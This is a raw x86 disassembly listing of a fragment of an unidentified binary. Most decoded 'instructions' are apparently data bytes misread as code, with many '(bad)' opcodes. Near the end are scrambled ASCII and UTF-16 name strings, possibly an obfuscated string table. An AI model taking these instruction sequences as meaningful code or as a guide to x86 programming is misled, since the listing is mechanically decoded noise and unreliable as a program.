  427921:	adc    al,0x0
  427923:	(bad)  
  427924:	xor    BYTE PTR [eax],al
  427926:	(bad)  
  427927:	dec    esp
  427928:	add    dh,dl
  42792a:	mov    BYTE PTR [ebp+0xff77],bh
  427930:	jmp    0x4278e8
  427932:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42793c:	mov    BYTE PTR [ebx-0xf],al
  42793f:	das    
  427940:	add    eax,0x80808019
  427945:	adc    bh,bh
  427947:	xchg   ecx,eax
  427948:	aaa    
  427949:	ficom  WORD PTR [ebx]
  42794b:	(bad)  
  42794c:	mov    BYTE PTR [ebx-0xf],al
  42794f:	das    
  427950:	add    eax,0x8080818e
  427955:	adc    bh,bh
  427957:	(bad)  
  427958:	aaa    
  427959:	ficom  WORD PTR [ebx]
  42795b:	(bad)  
  42795c:	test   BYTE PTR [ebx-0xf],al
  42795f:	aam    0x1c
  427961:	adc    bh,bh
  427963:	fidiv  WORD PTR [edi]
  427965:	ficom  WORD PTR [ebx]
  427967:	(bad)  
  427968:	mov    BYTE PTR [ebx-0xf],al
  42796b:	das    
  42796c:	add    eax,0x80808142
  427971:	adc    bh,bh
  427973:	out    0x37,al
  427975:	ficom  WORD PTR [ebx]
  427977:	in     al,dx
  427978:	iret   
  427979:	int    0x96
  42797b:	mov    ch,cl
  42797d:	(bad)  
  42797e:	dec    esp
  42797f:	int    0xe6
  427981:	mov    ch,cl
  427983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427984:	dec    esp
  427985:	cmp    edx,DWORD PTR [ecx]
  427987:	cmp    esp,ebx
  427989:	das    
  42798a:	inc    ebp
  42798b:	sti    
  42798c:	xchg   edx,eax
  42798d:	shr    ecx,cl
  42798f:	sub    BYTE PTR [edx],dl
  427991:	clc    
  427992:	add    BYTE PTR [eax-0x102c9380],0x92
  427999:	cmp    ebx,ebp
  42799b:	push   ebx
  42799c:	clc    
  42799d:	int    0xe6
  42799f:	mov    BYTE PTR [ebx-0x2b],dl
  4279a2:	int    0xa6
  4279a4:	dec    esp
  4279a5:	xchg   ecx,ebx
  4279a7:	sbb    esi,esp
  4279a9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279af:	int    0x96
  4279b1:	mov    ch,cl
  4279b3:	(bad)  
  4279b4:	dec    esp
  4279b5:	int    0xe6
  4279b7:	mov    ch,cl
  4279b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279ba:	dec    esp
  4279bb:	cmp    edx,DWORD PTR [ecx]
  4279bd:	cmp    esp,ebx
  4279bf:	das    
  4279c0:	inc    ebp
  4279c1:	sti    
  4279c2:	xchg   edx,eax
  4279c3:	shr    ecx,cl
  4279c5:	sub    BYTE PTR [ebx],bh
  4279c7:	fst    st(3)
  4279c9:	out    dx,eax
  4279ca:	xchg   edx,eax
  4279cb:	adc    bh,al
  4279cd:	add    BYTE PTR [eax-0x2aac9380],0x53
  4279d4:	clc    
  4279d5:	ds xchg esi,eax
  4279d7:	xor    BYTE PTR [esi],bl
  4279d9:	(bad)  
  4279da:	adc    al,0xcd
  4279dc:	xchg   esi,eax
  4279dd:	cmp    al,0xcd
  4279df:	(bad)  
  4279e0:	inc    esp
  4279e1:	int    0x96
  4279e3:	xor    ch,cl
  4279e5:	(bad)  
  4279e6:	adc    al,0xcd
  4279e8:	xchg   esi,eax
  4279e9:	xor    ch,cl
  4279eb:	(bad)  
  4279ec:	adc    al,0xcd
  4279ee:	out    0x30,al
  4279f0:	int    0xa6
  4279f2:	adc    al,0x3b
  4279f4:	adc    DWORD PTR [ebx],edi
  4279f6:	jecxz  0x427a27
  4279f8:	inc    ebp
  4279f9:	sti    
  4279fa:	xchg   edx,eax
  4279fb:	shr    ecx,cl
  4279fd:	sub    BYTE PTR [ebx],bh
  4279ff:	fst    QWORD PTR [edx]
  427a01:	clc    
  427a02:	add    BYTE PTR [eax-0x102c9380],0x92
  427a09:	push   ebx
  427a0a:	clc    
  427a0b:	int    0xe6
  427a0d:	cmp    al,0x53
  427a0f:	aad    0xcd
  427a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a12:	inc    esp
  427a13:	cmp    edi,edx
  427a15:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a1b:	lea    eax,[edi+ebp*1+0x45]
  427a1f:	loope  0x4279b3
  427a21:	cmp    ecx,ebx
  427a23:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a29:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a2e:	lea    esi,[eax]
  427a30:	shr    esp,cl
  427a32:	xchg   edx,eax
  427a33:	push   ebx
  427a34:	popf   
  427a35:	xchg   ecx,ebx
  427a37:	int    0x96
  427a39:	adc    al,0x1b
  427a3b:	hlt    
  427a3c:	add    al,0xf2
  427a3e:	std    
  427a3f:	shr    edi,cl
  427a41:	sub    BYTE PTR [ebx],bh
  427a43:	ins    DWORD PTR es:[edi],dx
  427a44:	adc    al,BYTE PTR [edx]
  427a46:	aam    0x37
  427a48:	ficom  WORD PTR [ebx]
  427a4a:	adc    bh,bl
  427a4c:	mov    ebp,0xcd25230a
  427a51:	out    0x3c,al
  427a53:	int    0xa6
  427a55:	inc    esp
  427a56:	add    al,0xe9
  427a58:	std    
  427a59:	adc    bh,al
  427a5b:	aam    0x37
  427a5d:	ficom  WORD PTR [ebx]
  427a5f:	adc    dh,ah
  427a61:	mov    ebp,0x8725230a
  427a66:	lock int 0xe6
  427a69:	and    al,0x1b
  427a6b:	aad    0x53
  427a6d:	rcl    BYTE PTR [esi-0x43],cl
  427a70:	or     ah,BYTE PTR [ebx]
  427a72:	and    eax,0x12025370
  427a77:	not    esi
  427a79:	aaa    
  427a7a:	ficom  WORD PTR [ebx]
  427a7c:	cwde   
  427a7d:	add    dh,dl
  427a7f:	xor    al,0x0
  427a81:	(bad)  
  427a82:	sub    al,0x9a
  427a84:	add    dh,dl
  427a86:	sbb    al,0x0
  427a88:	(bad)  
  427a89:	adc    al,0x0
  427a8b:	(bad)  
  427a8c:	xor    BYTE PTR [eax],al
  427a8e:	(bad)  
  427a8f:	dec    esp
  427a90:	add    dh,dl
  427a92:	mov    BYTE PTR [ebp+0xfef4],bh
  427a98:	or     cl,BYTE PTR [ebx-0x57557433]
  427a9e:	arpl   bx,cx
  427aa0:	sar    BYTE PTR [eax+eax*4],cl
  427aa3:	int    0x96
  427aa5:	mov    ch,cl
  427aa7:	(bad)  
  427aa8:	dec    esp
  427aa9:	int    0xe6
  427aab:	mov    ch,cl
  427aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aae:	dec    esp
  427aaf:	cmp    esp,ebx
  427ab1:	cmp    edx,DWORD PTR [ecx]
  427ab3:	das    
  427ab4:	inc    ebp
  427ab5:	sti    
  427ab6:	xchg   edx,eax
  427ab7:	shr    ecx,cl
  427ab9:	sub    BYTE PTR [edx],dl
  427abb:	clc    
  427abc:	add    BYTE PTR [eax-0x102c9380],0x92
  427ac3:	cmp    ebx,ebp
  427ac5:	push   ebx
  427ac6:	aad    0x53
  427ac8:	clc    
  427ac9:	int    0xe6
  427acb:	xor    ch,cl
  427acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ace:	adc    al,0x53
  427ad0:	fst    DWORD PTR [ebx-0xc]
  427ad3:	or     dl,BYTE PTR [esi+0x14d60a30]
  427ad9:	int    0x96
  427adb:	cmp    al,0xcd
  427add:	(bad)  
  427ade:	inc    esp
  427adf:	int    0x96
  427ae1:	xor    ch,cl
  427ae3:	(bad)  
  427ae4:	adc    al,0xcd
  427ae6:	xchg   esi,eax
  427ae7:	mov    ch,cl
  427ae9:	(bad)  
  427aea:	dec    esp
  427aeb:	int    0x96
  427aed:	mov    ch,cl
  427aef:	(bad)  
  427af0:	dec    esp
  427af1:	int    0xe6
  427af3:	mov    ch,cl
  427af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427af6:	dec    esp
  427af7:	cmp    esp,ebx
  427af9:	cmp    edx,DWORD PTR [ecx]
  427afb:	das    
  427afc:	inc    ebp
  427afd:	sti    
  427afe:	xchg   edx,eax
  427aff:	shr    ecx,cl
  427b01:	sub    BYTE PTR [edx],dl
  427b03:	clc    
  427b04:	add    BYTE PTR [eax-0x22c49380],0x53
  427b0b:	aad    0xd3
  427b0d:	out    dx,eax
  427b0e:	xchg   edx,eax
  427b0f:	push   ebx
  427b10:	clc    
  427b11:	int    0xe6
  427b13:	xor    ch,cl
  427b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b16:	adc    al,0x3b
  427b18:	cli    
  427b19:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b1f:	lea    edx,[edi+ebp*1]
  427b22:	inc    ebp
  427b23:	loope  0x427ab7
  427b25:	cmp    ecx,ebx
  427b27:	push   ebx
  427b28:	cli    
  427b29:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b2f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b34:	push   ebx
  427b35:	popf   
  427b36:	int    0x76
  427b38:	cmp    al,0xcd
  427b3a:	lea    eax,[edi+eax*4-0x27]
  427b3e:	int    0xe6
  427b40:	cmp    al,0x1b
  427b42:	hlt    
  427b43:	int    0xa6
  427b45:	inc    esp
  427b46:	adc    al,BYTE PTR [edx]
  427b48:	mov    ebp,0x5625230a
  427b4d:	jnp    0x427b86
  427b4f:	ficom  WORD PTR [ebx]
  427b51:	das    
  427b52:	inc    ebp
  427b53:	jge    0x427ae7
  427b55:	shr    ecx,cl
  427b57:	sub    bl,dl
  427b59:	jmp    0x427aed
  427b5b:	cmp    ebx,ebp
  427b5d:	adc    bh,al
  427b5f:	add    BYTE PTR [eax-0xfac9380],0x53
  427b66:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427b6c:	lea    ecx,[eax-0x32b36933]
  427b72:	out    0x30,al
  427b74:	int    0xa6
  427b76:	adc    al,0x4
  427b78:	repnz std 
  427b7a:	add    al,0xe9
  427b7c:	std    
  427b7d:	adc    al,BYTE PTR [edx]
  427b7f:	aam    0x37
  427b81:	ficom  WORD PTR [ebx]
  427b83:	adc    bh,al
  427b85:	aam    0x37
  427b87:	ficom  WORD PTR [ebx]
  427b89:	shr    edi,cl
  427b8b:	sub    BYTE PTR [ebx],bh
  427b8d:	ins    DWORD PTR es:[edi],dx
  427b8e:	adc    bh,bl
  427b90:	mov    ebp,0x1225230a
  427b95:	hlt    
  427b96:	mov    ebp,0x8725230a
  427b9b:	lock sbb edx,ebp
  427b9e:	jmp    0x427be7
  427ba0:	inc    DWORD PTR [eax]
  427ba2:	add    BYTE PTR [esi-0x12fb1233],dl
  427ba8:	sbb    al,0x98
  427baa:	pop    edi
  427bab:	(bad)  
  427bac:	aaa    
  427bad:	ficom  WORD PTR [ebx]
  427baf:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bb5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bbb:	jbe    0x427b7a
  427bbd:	xchg   ecx,eax
  427bbe:	aaa    
  427bbf:	ficom  WORD PTR [ebx]
  427bc1:	or     dh,BYTE PTR [esi-0x13]
  427bc4:	int    0x96
  427bc6:	adc    ebp,ecx
  427bc8:	(bad)  
  427bc9:	cmc    
  427bca:	call   0xefd3:0x92fb452f
  427bd1:	xchg   edx,eax
  427bd2:	int    0xd6
  427bd4:	adc    ebp,ecx
  427bd6:	out    0xf5,al
  427bd8:	jo     0x427bec
  427bda:	sti    
  427bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bdc:	mov    esi,0x3b4229
  427be1:	jno    0x427c36
  427be3:	(bad)  [edx]
  427be5:	xchg   esi,eax
  427be6:	std    
  427be7:	int    0x96
  427be9:	dec    esp
  427bea:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427bf0:	iret   
  427bf1:	jbe    0x427bf0
  427bf3:	add    dh,dl
  427bf5:	mov    bl,dl
  427bf7:	mov    ecx,0xd6007028
  427bfc:	dec    esp
  427bfd:	add    dh,dl
  427bff:	in     eax,dx
  427c00:	add    dh,dl
  427c02:	mov    ebp,0xf5d600
  427c07:	(bad)  
  427c08:	adc    DWORD PTR [ebp+0xfde6],edi
  427c0e:	stos   BYTE PTR es:[edi],al
  427c0f:	or     dh,BYTE PTR [esi-0x3]
  427c12:	int    0x76
  427c14:	std    
  427c15:	test   al,0xcb
  427c17:	ror    BYTE PTR [eax-0x12326980],cl
  427c1d:	add    al,0xb5
  427c1f:	stc    
  427c20:	add    al,0xed
  427c22:	inc    esp
  427c23:	cwde   
  427c24:	leave  
  427c25:	je     0x427c5b
  427c27:	xor    al,0x80
  427c29:	add    BYTE PTR [eax+0x3474c980],0x44
  427c30:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c37:	xor    BYTE PTR [eax+0x0],dh
  427c3a:	(bad)  
  427c3b:	xor    al,0x0
  427c3d:	(bad)  
  427c3e:	sub    al,0x0
  427c40:	(bad)  
  427c41:	and    al,0x0
  427c43:	(bad)  
  427c44:	sbb    al,0x0
  427c46:	(bad)  
  427c47:	adc    al,0x0
  427c49:	(bad)  
  427c4a:	xor    BYTE PTR [eax],al
  427c4c:	(bad)  
  427c4d:	dec    esp
  427c4e:	add    dh,dl
  427c50:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c56:	int    0x76
  427c58:	mov    BYTE PTR [edx],cl
  427c5a:	je     0x427c90
  427c5c:	test   ch,cl
  427c5e:	je     0x427c94
  427c60:	xor    al,0x6
  427c62:	ins    DWORD PTR es:[edi],dx
  427c63:	das    
  427c64:	add    eax,0x80808017
  427c69:	int    0x74
  427c6b:	xor    al,0x44
  427c6d:	push   es
  427c6e:	ins    DWORD PTR es:[edi],dx
  427c6f:	das    
  427c70:	add    eax,0x8080800a
  427c75:	add    ah,dl
  427c77:	xor    al,0x24
  427c79:	add    ah,dl
  427c7b:	xor    al,0x24
  427c7d:	add    ah,dl
  427c7f:	xor    al,0x24
  427c81:	int    0x74
  427c83:	xor    al,0x50
  427c85:	add    cl,dh
  427c87:	int    0x74
  427c89:	xor    al,0x84
  427c8b:	int    0x74
  427c8d:	xor    al,0x84
  427c8f:	int    0x74
  427c91:	xor    al,0x84
  427c93:	iret   
  427c94:	jbe    0x427c1a
  427c96:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427c9a:	int    0x74
  427c9c:	xor    al,0x3c
  427c9e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427ca2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427ca6:	int    0x74
  427ca8:	xor    al,0x84
  427caa:	int    0x74
  427cac:	xor    al,0x84
  427cae:	int    0x8c
  427cb0:	xor    al,0x84
  427cb2:	int    0xa
  427cb4:	and    eax,0xcd808081
  427cb9:	xor    ebp,ecx
  427cbb:	aam    0x34
  427cbd:	mov    ch,cl
  427cbf:	add    DWORD PTR ds:0x5e808081,ebp
  427cc5:	sbb    BYTE PTR [edi],ch
  427cc7:	or     edx,DWORD PTR ds:0xcd808081
  427ccd:	xor    ch,cl
  427ccf:	push   eax
  427cd0:	int    0x62
  427cd2:	fs iret 
  427cd4:	xchg   esp,eax
  427cd5:	sbb    BYTE PTR [eax-0x33],dh
  427cd8:	push   ecx
  427cd9:	int    0x22
  427cdb:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427ce1:	pop    esi
  427ce2:	sbb    BYTE PTR [edi],ch
  427ce4:	add    al,0x7b
  427ce6:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427cf0:	dec    edx
  427cf1:	int    0x80
  427cf3:	xor    ecx,DWORD PTR [edi]
  427cf5:	xchg   ebx,edx
  427cf7:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427cfd:	or     ch,0x74
  427d00:	xor    al,0x44
  427d02:	push   es
  427d03:	ins    DWORD PTR es:[edi],dx
  427d04:	das    
  427d05:	push   es
  427d06:	cwde   
  427d07:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d11:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d1b:	je     0x427d51
  427d1d:	test   ch,cl
  427d1f:	add    DWORD PTR ds:0xcd808081,esp
  427d25:	or     BYTE PTR [edx],0x74
  427d28:	xor    al,0x4c
  427d2a:	int    0x74
  427d2c:	xor    al,0x84
  427d2e:	int    0x1
  427d30:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d36:	int    0x80
  427d38:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d3c:	int    0x74
  427d3e:	xor    al,0x84
  427d40:	int    0x1
  427d42:	int3   
  427d43:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d4d:	dec    esp
  427d4e:	int    0x74
  427d50:	xor    al,0x84
  427d52:	int    0x8c
  427d54:	xor    al,0x84
  427d56:	int    0x1
  427d58:	popf   
  427d59:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427d63:	or     ch,0x89
  427d66:	imul   edx,ecx,0x3b358621
  427d6c:	jns    0x427d72
  427d6e:	add    bh,bh
  427d70:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427d76:	push   ebx
  427d77:	jge    0x427d83
  427d79:	mov    WORD PTR [esp+ecx*2],?
  427d7c:	leave  
  427d7d:	je     0x427db3
  427d7f:	mov    BYTE PTR [eax-0x327f7f80],al
  427d85:	je     0x427dbb
  427d87:	xor    al,0x6
  427d89:	ins    DWORD PTR es:[edi],dx
  427d8a:	aam    0x73
  427d8c:	int    0x74
  427d8e:	xor    al,0x30
  427d90:	add    al,0xbd
  427d92:	adc    ah,0x52
  427d95:	jl     0x427d6b
  427d97:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427d9b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427d9f:	add    ah,dl
  427da1:	xor    al,0x2c
  427da3:	add    ah,dl
  427da5:	xor    al,0x2c
  427da7:	add    ah,dl
  427da9:	xor    al,0x2c
  427dab:	add    ah,dl
  427dad:	xor    al,0x2c
  427daf:	int    0x74
  427db1:	xor    al,0x54
  427db3:	add    cl,dh
  427db5:	in     al,dx
  427db6:	cmp    BYTE PTR [eax],al
  427db8:	aam    0x34
  427dba:	and    al,0x0
  427dbc:	aam    0x34
  427dbe:	and    al,0x0
  427dc0:	aam    0x34
  427dc2:	and    al,0xcd
  427dc4:	je     0x427dfa
  427dc6:	push   eax
  427dc7:	add    cl,dh
  427dc9:	in     al,dx
  427dca:	and    al,BYTE PTR [eax]
  427dcc:	aam    0x34
  427dce:	adc    al,0xcd
  427dd0:	je     0x427e06
  427dd2:	cmp    al,0x0
  427dd4:	icebp  
  427dd5:	in     al,dx
  427dd6:	xchg   ch,cl
  427dd8:	je     0x427e0e
  427dda:	xor    al,0x0
  427ddc:	icebp  
  427ddd:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427de1:	int    0x74
  427de3:	xor    al,0x4c
  427de5:	push   es
  427de6:	ins    DWORD PTR es:[edi],dx
  427de7:	aam    0x4e
  427de9:	int    0x74
  427deb:	xor    al,0x84
  427ded:	leave  
  427dee:	add    DWORD PTR [ebp+0x41808081],ebp
  427df4:	and    DWORD PTR [esi+0x3474cd35],eax
  427dfa:	mov    ch,cl
  427dfc:	mov    WORD PTR [esp+eax*4],?
  427dff:	int    0xa
  427e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e02:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e0c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e12:	mov    ch,cl
  427e14:	mov    WORD PTR [eax+ecx*4],?
  427e17:	cmp    edi,DWORD PTR [ecx+0x4]
  427e1a:	add    bh,bh
  427e1c:	shl    edx,cl
  427e1e:	sub    bl,dl
  427e20:	mov    ebp,0xcdd35392
  427e25:	mov    WORD PTR [esp+ecx*2],?
  427e28:	inc    ebx
  427e29:	rcl    esi,cl
  427e2b:	and    ecx,ebp
  427e2d:	je     0x427e63
  427e2f:	test   ch,cl
  427e31:	mov    WORD PTR [esp+eax*4],?
  427e34:	int    0xa
  427e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e37:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e41:	add    BYTE PTR [eax],0x70
  427e44:	cmp    al,0xec
  427e46:	push   ds
  427e47:	iret   
  427e48:	jbe    0x427dce
  427e4a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e4e:	int    0x74
  427e50:	xor    al,0x4c
  427e52:	int    0x8c
  427e54:	xor    al,0x84
  427e56:	int    0xa
  427e58:	in     al,0x81
  427e5a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427e61:	je     0x427e97
  427e63:	test   ch,cl
  427e65:	add    ebp,ebp
  427e67:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427e71:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427e77:	or     bh,0x84
  427e7a:	adc    cl,ch
  427e7c:	mov    WORD PTR [esp+eax*4],?
  427e7f:	int    0xa
  427e81:	in     al,0x81
  427e83:	add    BYTE PTR [eax-0x76327f33],0x81
  427e8a:	mov    BYTE PTR [eax-0x2d591833],ch
  427e90:	sub    al,0x80
  427e92:	lds    edx,FWORD PTR [eax+0x75]
  427e95:	ins    BYTE PTR es:[edi],dx
  427e96:	jae    0x427f0f
  427e98:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427e9c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ea0:	add    BYTE PTR [ecx+0x74],ah
  427ea3:	ins    BYTE PTR es:[edi],dx
  427ea4:	popa   
  427ea5:	inc    esp
  427ea6:	gs popa 
  427ea8:	fs push 0x6561686d
  427eae:	add    BYTE PTR fs:[ebp+0x74],ah
  427eb2:	push   0x65726143
  427eb7:	outs   dx,DWORD PTR ds:[esi]
  427eb8:	jns    0x427f20
  427eba:	add    BYTE PTR gs:[edi+0x72],dh
  427ebe:	jns    0x427f2d
  427ec0:	popa   
  427ec1:	outs   dx,DWORD PTR ds:[esi]
  427ec2:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427ec6:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427eca:	push   0x6f6d6568
  427ecf:	add    BYTE PTR fs:[edx+0x65],dl
  427ed3:	arpl   WORD PTR [ebx+0x62],si
  427ed6:	popa   
  427ed7:	ins    BYTE PTR es:[edi],dx
  427ed8:	jne    0x427f52
  427eda:	gs jae 0x427edd
  427edd:	ins    DWORD PTR es:[edi],dx
  427ede:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427ee5:	outs   dx,DWORD PTR ds:[esi]
  427ee6:	jb     0x427f57
  427ee8:	jo     0x427eea
  427eea:	ja     0x427f4d
  427eec:	gs je  0x427f5e
  427eef:	jb     0x427f60
  427ef1:	bound  esp,QWORD PTR [ecx+0x70]
  427ef4:	add    BYTE PTR [ebx+0x69],cl
  427ef7:	outs   dx,BYTE PTR ds:[esi]
  427ef8:	addr16 addr16 popa 
  427efb:	outs   dx,BYTE PTR ds:[esi]
  427efc:	arpl   WORD PTR [ecx+0x70],sp
  427eff:	add    BYTE PTR [edi+0x6e],al
  427f02:	jne    0x427f77
  427f04:	je     0x427f6b
  427f06:	outs   dx,BYTE PTR ds:[esi]
  427f07:	push   esi
  427f08:	popa   
  427f09:	jb     0x427f84
  427f0b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f0f:	jb     0x427f61
  427f11:	popa   
  427f12:	ins    BYTE PTR es:[edi],dx
  427f13:	ins    DWORD PTR es:[edi],dx
  427f14:	je     0x427f7f
  427f16:	outs   dx,DWORD PTR ds:[esi]
  427f17:	ja     0x427f7e
  427f19:	jb     0x427f1b
  427f1b:	jo     0x427f82
  427f1d:	ins    DWORD PTR es:[edi],dx
  427f1e:	jns    0x427f94
  427f20:	push   0x6f656562
  427f25:	outs   dx,BYTE PTR ds:[esi]
  427f26:	push   eax
  427f27:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f2e:	inc    ebx
  427f2f:	outs   dx,DWORD PTR ds:[esi]
  427f30:	popa   
  427f31:	ins    BYTE PTR es:[edi],dx
  427f32:	popa   
  427f33:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f3a:	je     0x427fb5
  427f3c:	outs   dx,DWORD PTR gs:[esi]
  427f3e:	outs   dx,BYTE PTR ds:[esi]
  427f3f:	gs ins BYTE PTR es:[edi],dx
  427f41:	inc    ebx
  427f42:	push   0x54007261
  427f47:	jns    0x427fb9
  427f49:	jns    0x427fb8
  427f4b:	jne    0x427fb2
  427f4d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f51:	outs   dx,DWORD PTR ds:[esi]
  427f52:	je     0x427f96
  427f54:	gs gs jb 0x427fc8
  427f58:	outs   dx,DWORD PTR ds:[esi]
  427f59:	je     0x427fc6
  427f5b:	imul   eax,DWORD PTR [eax],0x616c7548
  427f61:	jo     0x427fcc
  427f63:	popa   
  427f64:	ins    BYTE PTR es:[edi],dx
  427f65:	dec    ebx
  427f66:	outs   dx,BYTE PTR ds:[esi]
  427f67:	popa   
  427f68:	jo     0x427fe3
  427f6a:	add    BYTE PTR gs:[eax+0x6f],dh
  427f6e:	je     0x427fb2
  427f70:	gs ins BYTE PTR es:[edi],dx
  427f72:	jae    0x427fe3
  427f74:	js     0x427f76
  427f76:	popa   
  427f77:	data16 je 0x427fc0
  427f7a:	ins    BYTE PTR es:[edi],dx
  427f7b:	popa   
  427f7c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427f80:	gs jae 0x427fe4
  427f83:	jb     0x427f85
  427f85:	inc    edx
  427f86:	ins    BYTE PTR es:[edi],dx
  427f87:	popa   
  427f88:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427f8c:	je     0x427ff4
  427f8e:	ins    BYTE PTR es:[edi],dx
  427f8f:	jns    0x428006
  427f91:	push   0x6d6d6800
  427f96:	popa   
  427f97:	inc    edi
  427f98:	popa   
  427f99:	ins    BYTE PTR es:[edi],dx
  427f9a:	ins    BYTE PTR es:[edi],dx
  427f9b:	push   0x48007361
  427fa0:	outs   dx,DWORD PTR ds:[esi]
  427fa1:	ins    DWORD PTR es:[edi],dx
  427fa2:	outs   dx,DWORD PTR gs:[esi]
  427fa4:	jb     0x42800b
  427fa6:	data16 jno 0x428012
  427fa9:	jae    0x42800c
  427fab:	bound  esi,QWORD PTR [eax+0x61]
  427fae:	add    BYTE PTR [ebp+0x74],ah
  427fb1:	outs   dx,BYTE PTR ds:[esi]
  427fb2:	gs addr16 jbe 0x428017
  427fb6:	je     0x428031
  427fb8:	gs popa 
  427fba:	add    BYTE PTR [ebp+0x67],ah
  427fbd:	outs   dx,DWORD PTR ds:[esi]
  427fbe:	inc    edi
  427fbf:	popa   
  427fc0:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  427fc8:	jo     0x42802f
  427fca:	fs jbe 0x42802e
  427fcd:	je     0x428044
  427fcf:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  427fd3:	outs   dx,DWORD PTR ds:[esi]
  427fd4:	add    BYTE PTR [edx+0x0],ch
  427fd7:	jne    0x427fd9
  427fd9:	add    BYTE PTR [bp+0x0],ch
  427fdd:	popa   
  427fde:	add    BYTE PTR [esi+0x0],ch
  427fe1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  427fe6:	add    BYTE PTR [ebp+0x0],dh
  427fe9:	ins    DWORD PTR es:[edi],dx
  427fea:	add    BYTE PTR [eax],al
  427fec:	add    BYTE PTR [edi+0x0],ch
  427fef:	jb     0x427ff1
  427ff1:	ja     0x427ff3
  427ff3:	imul   eax,DWORD PTR [eax],0x680073
  427ff9:	outs   dx,BYTE PTR ds:[esi]
  427ffa:	add    BYTE PTR [ecx+0x0],ch
  427ffd:	add    BYTE PTR fs:[ecx+0x0],ch
  428001:	ja     0x428003
  428003:	imul   eax,DWORD PTR [eax],0x65006e
  428009:	push   0x70000000
  42800e:	add    BYTE PTR [ecx+0x0],ah
  428011:	je     0x428013
  428013:	jbe    0x428015
  428015:	add    BYTE PTR gs:[ebp+0x0],ah
  428019:	je     0x42801b
  42801b:	add    BYTE PTR gs:[edi+0x0],ah
  42801f:	ins    BYTE PTR es:[edi],dx
  428020:	add    BYTE PTR [ecx+0x0],ah
  428023:	imul   eax,DWORD PTR [eax],0x66
  428029:	outs   dx,DWORD PTR ds:[esi]
  42802a:	add    BYTE PTR [esi+0x0],ch
  42802d:	je     0x42802f
  42802f:	popa   
  428030:	add    BYTE PTR [edi+0x0],dh
  428033:	push   ebx
  428034:	add    BYTE PTR [edi+0x0],ch
  428037:	arpl   WORD PTR [eax],ax
  428039:	imul   eax,DWORD PTR [eax],0x61
  42803c:	add    BYTE PTR [esi+0x0],dh
  42803f:	outs   dx,DWORD PTR ds:[esi]
  428040:	add    BYTE PTR [eax],al
  428042:	add    BYTE PTR [ebp+0x0],ch
  428045:	jns    0x428047
  428047:	add    BYTE PTR gs:[esi+0x0],ah
  42804b:	ins    BYTE PTR es:[edi],dx
  42804c:	add    BYTE PTR [ecx+0x0],ah
  42804f:	jns    0x428051
  428051:	jbe    0x428053
  428053:	popa   
  428054:	add    BYTE PTR [esi+0x0],ch
  428057:	popa   
  428058:	add    BYTE PTR [edi+0x0],ah
  42805b:	outs   dx,DWORD PTR ds:[esi]
  42805c:	add    BYTE PTR [eax],al
  42805e:	add    BYTE PTR [edi+0x0],ch
  428061:	jb     0x428063
  428063:	jae    0x428065
  428065:	imul   eax,DWORD PTR [eax],0x47006e
  42806b:	imul   eax,DWORD PTR [eax],0x70006d
  428071:	bound  eax,QWORD PTR [eax]
  428073:	outs   dx,DWORD PTR ds:[esi]
  428074:	add    BYTE PTR [eax+0x0],dh
